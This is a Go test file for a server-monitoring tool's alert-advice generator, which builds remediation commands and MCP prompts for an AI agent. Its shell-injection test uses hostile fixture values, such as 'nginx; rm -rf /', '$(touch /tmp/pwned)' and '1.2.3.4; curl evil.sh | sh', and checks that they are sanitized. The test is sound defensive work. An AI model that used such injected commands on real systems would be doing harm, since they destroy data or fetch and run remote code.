package monitor

import (
	"strings"
	"testing"
	"time"

	"github.com/icaruszezen/ServerNeedSafe/internal/vault"
)

func TestBuildAlertAdviceCoversAllDefaultRules(t *testing.T) {
	rules := vault.DefaultMonitorAlertRules()
	if len(rules) == 0 {
		t.Fatal("expected non-empty DefaultMonitorAlertRules")
	}

	snap := &vault.ServerMonitorSnapshot{
		ServerID:              "srv-1",
		ServerName:            "prod-app-01",
		Host:                  "10.0.0.10",
		Port:                  22,
		Reachable:             true,
		OS:                    "Ubuntu 24.04 LTS",
		Kernel:                "6.8.0-generic",
		Uptime:                "12d 3h",
		BootTime:              "2026-11-15 06:00:00",
		CPUCores:              4,
		CPUPercent:            95.2,
		CPUStealPct:           24.5,
		CPUIowaitPct:          42.0,
		Load1:                 8.4,
		LoadPerCore:           2.1,
		MemPercent:            93.5,
		SwapPercent:           78.0,
		SwapTotalMB:           2048,
		SwapUsedMB:            1600,
		OOMKills:              3,
		OOMKillsDelta:         1,
		FDUsed:                90000,
		FDMax:                 100000,
		FDPercent:             90.0,
		ProcsTotal:            240,
		ProcsRunning:          12,
		ProcsZombie:           8,
		ProcsBlocked:          6,
		CPUTempC:              86.5,
		DiskPercent:           94.0,
		MaxPartMount:          "/var/log",
		MaxPartPercent:        94.0,
		MaxInodeMount:         "/var/spool",
		MaxInodePercent:       93.0,
		DiskFullForecastHours: 4.5,
		DiskFullForecastMount: "/var/log",
		ReadOnlyMounts:        []string{"/data"},
		RAIDDegraded:          []string{"md0 [2/1] [U_]"},
		KernelErrorCount:      2,
		KernelErrors:          []string{"EXT4-fs error (device vda1): ext4_find_entry"},
		Disks: []vault.DiskPartitionStat{
			{MountPoint: "/var/log", Device: "/dev/vdb1", FSType: "ext4", TotalGB: 100, UsedGB: 94, AvailGB: 6, UsedPercent: 94.0, InodePercent: 40.0},
			{MountPoint: "/var/spool", Device: "/dev/vda1", FSType: "ext4", TotalGB: 50, UsedGB: 20, AvailGB: 30, UsedPercent: 40.0, InodePercent: 93.0},
		},
		Interfaces: []vault.NetInterfaceStat{
			{Name: "eth0", IPv4: "10.0.0.10", RxErrors: 120, RxDrops: 35},
		},
		TopCPUProcs: []vault.ProcessStat{
			{PID: 4321, User: "www-data", CPUPercent: 91.4, MemPercent: 12.0, Command: "python3 worker.py"},
		},
		TopMemProcs: []vault.ProcessStat{
			{PID: 5512, User: "mysql", CPUPercent: 15.0, MemPercent: 68.5, RSSMB: 5400, Command: "/usr/sbin/mysqld"},
		},
		ListeningPorts: []vault.ListeningPortStat{
			{Proto: "tcp", BindAddr: "0.0.0.0", Port: 6379, PublicExposed: true, PID: 778, Process: "redis-server"},
		},
		Services: []vault.ServiceStat{
			{Name: "nginx", State: "failed", SubState: "failed", Watched: true},
		},
		SystemdFailedCount: 1,
		SystemdFailedUnits: []string{"nginx.service"},
		Docker: vault.DockerSummary{
			Installed:      true,
			Running:        2,
			Unhealthy:      1,
			ExitedAbnormal: 1,
			Containers: []vault.ContainerStat{
				{Name: "api-gateway", Image: "app:v1", State: "running", Status: "Up 2 hours (unhealthy)", Health: "unhealthy"},
			},
		},
		Security: vault.SecurityPostureStat{
			SSHFailedRecent:    145,
			TopFailedIPs:       []string{"203.0.113.55"},
			FirewallStatus:     "inactive",
			FirewallDetail:     "ufw",
			UIDZeroUsers:       []string{"root", "sysbackdoor"},
			FileDrifts:         []string{"/etc/ssh/sshd_config (内容已变更)"},
			PersistenceDrifts:  []string{"crontab / systemd 持久化配置指纹变化"},
			SuspiciousProcs:    []vault.SuspiciousProcStat{{PID: 9912, User: "nobody", Reason: "tmp_exec", Severity: "critical", Command: "/tmp/.xmrig"}},
			SuspiciousOutbound: []vault.OutboundConnStat{{RemoteIP: "198.51.100.7", RemotePort: 3333, PID: 9912, Process: ".xmrig", Reason: "mining_pool_port"}},
			NewSSHLoginIPs:     []string{"198.51.100.99"},
			RecentSSHLogins:    []vault.SSHLoginEvent{{User: "root", FromIP: "198.51.100.99", Method: "publickey", Timestamp: "2026-11-27 09:00:00"}},
		},
		ClockOffsetSec: 85,
	}

	runbooks := []vault.AIRunbook{
		{ID: "rb-disk", Title: "清理日志与磁盘扩容手册", Category: "storage", Symptom: "磁盘空间占满", Tags: []string{"disk", "清理"}},
		{ID: "rb-ssh", Title: "SSH 暴力破解应急封禁", Category: "security", Symptom: "SSH 登录失败激增", Tags: []string{"ssh", "爆破"}},
	}

	for _, r := range rules {
		subKey := ""
		if r.Kind == "disk_high" {
			subKey = "/var/log"
		} else if r.Kind == "inode_high" {
			subKey = "/var/spool"
		} else if r.Kind == "systemd_failed" {
			subKey = "watched"
		}
		al := vault.MonitorAlert{
			ID:            "al-" + r.Kind,
			DedupKey:      "srv-1|" + r.Kind + "|" + subKey,
			ServerID:      "srv-1",
			ServerName:    "prod-app-01",
			Host:          "10.0.0.10:22",
			RuleKind:      r.Kind,
			RuleName:      r.Name,
			Severity:      vault.SeverityCritical,
			Status:        vault.AlertStatusFiring,
			Title:         "Test alert for " + r.Kind,
			Detail:        "Detail for " + r.Kind,
			MetricText:    "95%",
			ThresholdText: ">= 90%",
			Occurrences:   2,
			TriggeredAt:   time.Now().UTC().Add(-10 * time.Minute),
			LastSeenAt:    time.Now().UTC(),
		}

		adv := BuildAlertAdvice(al, snap, runbooks)
		if adv == nil {
			t.Fatalf("rule %s returned nil advice", r.Kind)
		}
		if strings.TrimSpace(adv.Summary) == "" {
			t.Errorf("rule %s missing advice summary", r.Kind)
		}
		if strings.TrimSpace(adv.RootCause) == "" {
			t.Errorf("rule %s missing root_cause", r.Kind)
		}
		if len(adv.Steps) == 0 {
			t.Errorf("rule %s missing remediation steps", r.Kind)
		}
		if len(adv.Commands) == 0 {
			t.Errorf("rule %s missing remediation commands", r.Kind)
		}
		if strings.TrimSpace(adv.AIPrompt) == "" {
			t.Errorf("rule %s missing ai_prompt", r.Kind)
		}
		if strings.TrimSpace(adv.MCPPrompt) == "" {
			t.Errorf("rule %s missing mcp_prompt", r.Kind)
		}
		for _, want := range []string{"serverneedsafe", `"srv-1"`, "get_ops_context", "get_server_detail", "propose_change_plan"} {
			if !strings.Contains(adv.MCPPrompt, want) {
				t.Errorf("rule %s mcp_prompt missing %q", r.Kind, want)
			}
		}
		if RuleCategoryForKind(r.Kind) == "other" {
			t.Errorf("rule %s mapped to unexpected 'other' category", r.Kind)
		}
		for _, cmd := range adv.Commands {
			if cmd.Risk != "readonly" && cmd.Risk != "mutating" {
				t.Errorf("rule %s command %q has invalid risk %q", r.Kind, cmd.Label, cmd.Risk)
			}
			if strings.TrimSpace(cmd.Command) == "" {
				t.Errorf("rule %s command %q has empty command string", r.Kind, cmd.Label)
			}
		}

		switch r.Kind {
		case "cpu_high":
			if !strings.Contains(adv.Summary, "4321") {
				t.Errorf("cpu_high advice should reference top PID 4321, got %q", adv.Summary)
			}
		case "disk_high":
			if !strings.Contains(adv.Summary, "/var/log") {
				t.Errorf("disk_high advice should reference mount /var/log, got %q", adv.Summary)
			}
			if len(adv.Runbooks) == 0 || adv.Runbooks[0].ID != "rb-disk" {
				t.Errorf("disk_high advice should match rb-disk runbook, got %+v", adv.Runbooks)
			}
		case "ssh_bruteforce":
			if !strings.Contains(adv.Summary, "203.0.113.55") {
				t.Errorf("ssh_bruteforce advice should reference top failed IP, got %q", adv.Summary)
			}
			foundUFW := false
			for _, c := range adv.Commands {
				if strings.Contains(c.Command, "ufw insert 1 deny from 203.0.113.55") && c.Risk == "mutating" {
					foundUFW = true
				}
			}
			if !foundUFW {
				t.Errorf("ssh_bruteforce with ufw firewall should suggest mutating ufw block command, got %+v", adv.Commands)
			}
		case "port_drift":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "accept_port_baseline" {
				t.Errorf("port_drift should expose accept_port_baseline quick action, got %+v", adv.QuickActions)
			}
		case "security_file_drift":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "accept_security_baseline" {
				t.Errorf("%s should expose accept_security_baseline quick action, got %+v", r.Kind, adv.QuickActions)
			}
		case "ssh_new_login_ip":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "trust_ssh_login_ip" || adv.QuickActions[0].Target != "198.51.100.99" {
				t.Errorf("%s should expose trust_ssh_login_ip quick action for 198.51.100.99, got %+v", r.Kind, adv.QuickActions)
			}
		case "host_key_changed":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "open_vault_known_hosts" {
				t.Errorf("host_key_changed should expose open_vault_known_hosts quick action, got %+v", adv.QuickActions)
			}
		}
	}
}

func TestBuildAlertAdvicePreventsShellInjection(t *testing.T) {
	maliciousSnap := &vault.ServerMonitorSnapshot{
		ServerID:  "srv-evil",
		Reachable: true,
		OS:        "Ubuntu 22.04",
		Services: []vault.ServiceStat{
			{Name: "nginx; rm -rf /", State: "failed", Watched: true},
		},
		SystemdFailedUnits: []string{"$(touch /tmp/pwned).service"},
		Docker: vault.DockerSummary{
			Installed: true,
			Unhealthy: 1,
			Containers: []vault.ContainerStat{
				{Name: "web`id`", State: "running", Health: "unhealthy", Status: "Up (unhealthy)"},
			},
		},
		Security: vault.SecurityPostureStat{
			SSHFailedRecent: 200,
			TopFailedIPs:    []string{"1.2.3.4; curl evil.sh | sh"},
			FirewallDetail:  "ufw",
			UIDZeroUsers:    []string{"root", "evil$(id)"},
		},
	}

	// 1. Malicious IP must be rejected by net.ParseIP
	sshAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", RuleKind: "ssh_bruteforce", Severity: vault.SeverityCritical, Status: vault.AlertStatusFiring,
	}, maliciousSnap, nil)
	for _, c := range sshAdv.Commands {
		if strings.Contains(c.Command, "evil.sh") || strings.Contains(c.Command, "1.2.3.4;") {
			t.Fatalf("malicious IP leaked into command: %q", c.Command)
		}
	}

	// 1b. Malicious IP in ssh_new_login_ip dedup key must also be rejected, while valid IP works even when snapshot is nil
	evilLoginAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|ssh_new_login_ip|1.2.3.4; rm -rf /", RuleKind: "ssh_new_login_ip", Severity: vault.SeverityWarning, Status: vault.AlertStatusFiring,
	}, maliciousSnap, nil)
	for _, c := range evilLoginAdv.Commands {
		if strings.Contains(c.Command, "rm -rf") || strings.Contains(c.Command, "1.2.3.4;") {
			t.Fatalf("malicious ssh_new_login_ip dedup IP leaked into command: %q", c.Command)
		}
	}
	for _, qa := range evilLoginAdv.QuickActions {
		if qa.Kind == "trust_ssh_login_ip" {
			t.Fatalf("malicious IP should not produce trust_ssh_login_ip quick action: %+v", qa)
		}
	}
	staleLoginAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-1", DedupKey: "srv-1|ssh_new_login_ip|203.0.113.88", RuleKind: "ssh_new_login_ip", Severity: vault.SeverityWarning, Status: vault.AlertStatusFiring,
	}, nil, nil)
	if len(staleLoginAdv.QuickActions) == 0 || staleLoginAdv.QuickActions[0].Kind != "trust_ssh_login_ip" || staleLoginAdv.QuickActions[0].Target != "203.0.113.88" {
		t.Fatalf("expected trust_ssh_login_ip action even after 15m window with nil snapshot, got %+v", staleLoginAdv.QuickActions)
	}

	// 2. Malicious systemd unit / container name / username must be ignored by strict identifier sanitizer
	svcAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|systemd_failed|watched", RuleKind: "systemd_failed",
	}, maliciousSnap, nil)
	for _, c := range svcAdv.Commands {
		if strings.Contains(c.Command, "rm -rf") || strings.Contains(c.Command, "pwned") {
			t.Fatalf("malicious systemd unit leaked into command: %q", c.Command)
		}
	}

	docAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|docker_unhealthy|", RuleKind: "docker_unhealthy",
	}, maliciousSnap, nil)
	for _, c := range docAdv.Commands {
		if strings.Contains(c.Command, "`id`") {
			t.Fatalf("malicious container name leaked into command: %q", c.Command)
		}
	}

	uidAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", RuleKind: "uid_zero_backdoor",
	}, maliciousSnap, nil)
	for _, c := range uidAdv.Commands {
		if strings.Contains(c.Command, "evil$(id)") {
			t.Fatalf("malicious username leaked into command: %q", c.Command)
		}
	}

	// 3. Mount point with single quotes must be safely single-quoted
	diskAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|disk_high|/mnt/data'test;id", RuleKind: "disk_high",
	}, maliciousSnap, nil)
	if len(diskAdv.Commands) == 0 || !strings.Contains(diskAdv.Commands[0].Command, `'/mnt/data'\''test;id'`) {
		t.Fatalf("expected properly shell-quoted mount path, got: %+v", diskAdv.Commands)
	}
}

func TestBuildAlertAdviceMacOSCompatibility(t *testing.T) {
	macSnap := &vault.ServerMonitorSnapshot{
		ServerID:  "srv-mac",
		Reachable: true,
		OS:        "macOS 15.1",
		Kernel:    "Darwin 24.1.0",
		Security: vault.SecurityPostureStat{
			FirewallStatus: "inactive",
			FirewallDetail: "macos-alf",
		},
	}

	cpuAdv := BuildAlertAdvice(vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "cpu_high"}, macSnap, nil)
	if len(cpuAdv.Commands) == 0 || !strings.Contains(cpuAdv.Commands[0].Command, "ps aux -r") {
		t.Fatalf("expected macOS ps command, got %+v", cpuAdv.Commands)
	}

	fwAdv := BuildAlertAdvice(vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "firewall_inactive"}, macSnap, nil)
	if len(fwAdv.Commands) == 0 || !strings.Contains(fwAdv.Commands[0].Command, "socketfilterfw") {
		t.Fatalf("expected macOS socketfilterfw command, got %+v", fwAdv.Commands)
	}

	inodeAdv := BuildAlertAdvice(vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "inode_high"}, macSnap, nil)
	if len(inodeAdv.Commands) == 0 || strings.Contains(inodeAdv.Commands[0].Command, "-printf") {
		t.Fatalf("expected BSD-safe inode command on macOS without GNU find -printf, got %+v", inodeAdv.Commands)
	}

	macSnap.ListeningPorts = []vault.ListeningPortStat{
		{Proto: "tcp", BindAddr: "0.0.0.0", Port: 22, PublicExposed: true, Process: "sshd", PID: 100},
		{Proto: "udp", BindAddr: "0.0.0.0", Port: 63446, PublicExposed: true, Process: "RustDesk", PID: 200, DriftIgnored: true, IgnoreReason: "全局进程白名单: rustdesk*"},
		{Proto: "tcp", BindAddr: "0.0.0.0", Port: 9876, PublicExposed: true, Process: "CustomP2P", PID: 300},
	}
	driftAdv := BuildAlertAdviceWithPortBaseline(
		vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "port_drift"},
		macSnap,
		[]string{"tcp/22"},
		nil,
	)
	if len(driftAdv.Commands) == 0 || strings.Contains(driftAdv.Commands[0].Command, "ss -tulnp") {
		t.Fatalf("expected macOS lsof/netstat command for port_drift, got %+v", driftAdv.Commands)
	}
	if len(driftAdv.Evidence) == 0 || !strings.Contains(driftAdv.Evidence[0], "CustomP2P") || strings.Contains(driftAdv.Evidence[0], "sshd") {
		t.Fatalf("expected port_drift evidence to pinpoint actual drifted port CustomP2P (not baseline sshd), got %+v", driftAdv.Evidence)
	}
	if len(driftAdv.QuickActions) < 2 || driftAdv.QuickActions[0].Kind != "accept_port_baseline" ||
		driftAdv.QuickActions[1].Kind != "ignore_port_drift_process" || driftAdv.QuickActions[1].Target != "CustomP2P" {
		t.Fatalf("expected accept_port_baseline + ignore_port_drift_process(CustomP2P), got %+v", driftAdv.QuickActions)
	}
}

func TestBuildAlertSummaryGlobalAndScoped(t *testing.T) {
	alerts := []vault.MonitorAlert{
		{ID: "1", ServerID: "s1", RuleKind: "cpu_high", Severity: vault.SeverityCritical, Status: vault.AlertStatusFiring},
		{ID: "2", ServerID: "s1", RuleKind: "disk_high", Severity: vault.SeverityWarning, Status: vault.AlertStatusAcknowledged},
		{ID: "3", ServerID: "s2", RuleKind: "ssh_bruteforce", Severity: vault.SeverityCritical, Status: vault.AlertStatusFiring},
		{ID: "4", ServerID: "s2", RuleKind: "mem_high", Severity: vault.SeverityWarning, Status: vault.AlertStatusResolved},
	}

	global := BuildAlertSummary(alerts, "")
	if global.TotalActive != 3 || global.Firing != 2 || global.Acknowledged != 1 || global.Resolved != 1 {
		t.Fatalf("unexpected global summary: %+v", global)
	}
	if global.CriticalActive != 2 || global.WarningActive != 1 || global.AffectedServers != 2 {
		t.Fatalf("unexpected global severity/server counts: %+v", global)
	}
	if global.ActiveByServer["s1"] != 2 || global.ActiveByServer["s2"] != 1 {
		t.Fatalf("unexpected ActiveByServer: %+v", global.ActiveByServer)
	}
	if global.ActiveByCategory["compute"] != 1 || global.ActiveByCategory["storage"] != 1 || global.ActiveByCategory["security"] != 1 {
		t.Fatalf("unexpected ActiveByCategory: %+v", global.ActiveByCategory)
	}

	scoped := BuildAlertSummary(alerts, "s2")
	if scoped.TotalActive != 1 || scoped.Firing != 1 || scoped.Resolved != 1 || scoped.AffectedServers != 1 {
		t.Fatalf("unexpected scoped summary for s2: %+v", scoped)
	}
}

func TestBuildAlertMCPPromptVariants(t *testing.T) {
	now := time.Date(2026, 11, 27, 16, 10, 0, 0, time.UTC)
	resolvedAt := now.Add(5 * time.Minute)

	// 1. Standard Linux alert includes OS/kernel, readonly & mutating guidance, matched runbook, and MCP tools
	linuxSnap := &vault.ServerMonitorSnapshot{
		ServerID:       "srv-prod-1",
		Reachable:      true,
		OS:             "Ubuntu 24.04 LTS",
		Kernel:         "6.8.0-generic",
		DiskPercent:    94.0,
		MaxPartMount:   "/var/log",
		MaxPartPercent: 94.0,
		Disks: []vault.DiskPartitionStat{
			{MountPoint: "/var/log", Device: "/dev/vdb1", FSType: "ext4", TotalGB: 100, UsedGB: 94, AvailGB: 6, UsedPercent: 94.0},
		},
	}
	runbooks := []vault.AIRunbook{
		{ID: "rb-disk-01", Title: "日志轮转与磁盘清理 SOP", Category: "storage", Symptom: "磁盘空间不足", Tags: []string{"disk", "日志"}},
	}
	diskAdv := BuildAlertAdvice(vault.MonitorAlert{
		ID:            "al-disk-1",
		DedupKey:      "srv-prod-1|disk_high|/var/log",
		ServerID:      "srv-prod-1",
		ServerName:    "prod-api-01",
		Host:          "10.0.0.10:22",
		RuleKind:      "disk_high",
		RuleName:      "磁盘空间高水位",
		Severity:      vault.SeverityCritical,
		Status:        vault.AlertStatusFiring,
		Title:         "磁盘 /var/log 使用率达 94.0%",
		Detail:        "可用空间仅剩 6.0 GB",
		MetricText:    "94.0%",
		ThresholdText: ">= 90%",
		Occurrences:   3,
		TriggeredAt:   now.Add(-15 * time.Minute),
		LastSeenAt:    now,
	}, linuxSnap, runbooks)

	for _, want := range []string{
		"serverneedsafe",
		"server_id: `srv-prod-1`",
		"Ubuntu 24.04 LTS（内核 6.8.0-generic）",
		"`rb-disk-01` — 日志轮转与磁盘清理 SOP",
		"get_ops_context(server_ids=[\"srv-prod-1\"])",
		"get_server_detail(server_id=\"srv-prod-1\", range=\"1h\")",
		"exec_readonly_ssh(server_ids=[\"srv-prod-1\"], ...)",
		"propose_change_plan",
		"wait_for_approval",
	} {
		if !strings.Contains(diskAdv.MCPPrompt, want) {
			t.Errorf("disk_high MCPPrompt missing %q:\n%s", want, diskAdv.MCPPrompt)
		}
	}

	// 2. macOS alert includes BSD/macOS compatibility note
	macSnap := &vault.ServerMonitorSnapshot{
		ServerID:  "srv-mac-1",
		Reachable: true,
		OS:        "macOS 15.1",
		Kernel:    "Darwin 24.1.0",
	}
	macAdv := BuildAlertAdvice(vault.MonitorAlert{
		ID:         "al-mac-cpu",
		ServerID:   "srv-mac-1",
		ServerName: "mac-mini-build",
		RuleKind:   "cpu_high",
		Severity:   vault.SeverityWarning,
		Status:     vault.AlertStatusFiring,
	}, macSnap, nil)
	if !strings.Contains(macAdv.MCPPrompt, "BSD/macOS") {
		t.Errorf("expected BSD/macOS hint in macOS MCPPrompt, got:\n%s", macAdv.MCPPrompt)
	}

	// 3. offline alert uses probe_server instead of directing immediate exec_readonly_ssh
	offlineAdv := BuildAlertAdvice(vault.MonitorAlert{
		ID:         "al-off-1",
		ServerID:   "srv-off-1",
		ServerName: "edge-01",
		RuleKind:   "offline",
		Severity:   vault.SeverityCritical,
		Status:     vault.AlertStatusFiring,
	}, nil, nil)
	if !strings.Contains(offlineAdv.MCPPrompt, `probe_server(server_id="srv-off-1")`) {
		t.Errorf("expected probe_server guidance for offline alert, got:\n%s", offlineAdv.MCPPrompt)
	}
	if strings.Contains(offlineAdv.MCPPrompt, "通过 `exec_readonly_ssh` 执行") {
		t.Errorf("offline alert should label commands as out-of-band/post-recovery, got:\n%s", offlineAdv.MCPPrompt)
	}

	// 4. host_key_changed alert warns against bypassing host key verification
	hkAdv := BuildAlertAdvice(vault.MonitorAlert{
		ID:         "al-hk-1",
		ServerID:   "srv-hk-1",
		ServerName: "edge-02",
		RuleKind:   "host_key_changed",
		Severity:   vault.SeverityCritical,
		Status:     vault.AlertStatusFiring,
	}, nil, nil)
	if !strings.Contains(hkAdv.MCPPrompt, "切勿尝试绕过或忽略 SSH 主机指纹校验") {
		t.Errorf("expected strict host key safety instruction, got:\n%s", hkAdv.MCPPrompt)
	}

	// 5. Resolved alert switches to post-mortem phrasing and includes resolved timestamp
	resAdv := BuildAlertAdvice(vault.MonitorAlert{
		ID:          "al-res-1",
		ServerID:    "srv-prod-1",
		ServerName:  "prod-api-01",
		RuleKind:    "cpu_high",
		Severity:    vault.SeverityWarning,
		Status:      vault.AlertStatusResolved,
		TriggeredAt: now,
		LastSeenAt:  resolvedAt,
		ResolvedAt:  &resolvedAt,
	}, linuxSnap, nil)
	if !strings.Contains(resAdv.MCPPrompt, "复盘以下已恢复的服务器监控告警") || !strings.Contains(resAdv.MCPPrompt, "恢复时间：2026-11-27T16:15:00Z") {
		t.Errorf("expected post-mortem wording and resolved timestamp, got:\n%s", resAdv.MCPPrompt)
	}
}
